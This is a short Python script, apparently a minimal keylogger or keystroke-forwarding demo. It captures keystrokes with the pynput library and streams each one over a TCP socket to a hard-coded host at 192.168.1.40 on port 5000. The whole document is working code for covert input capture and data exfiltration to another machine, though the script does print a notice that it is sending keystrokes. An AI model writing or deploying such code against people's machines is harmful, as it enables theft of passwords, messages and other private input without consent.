import socket
from pynput import keyboard

SERVER_IP = "192.168.1.40"  # Change this to Laptop A's IP
PORT = 5000

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, PORT))

def on_press(key):
    try:
        key_data = key.char if key.char else str(key)
        client.sendall(key_data.encode())
    except AttributeError:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()

print("Sending keystrokes... Press Ctrl+C to stop.")
listener.join()
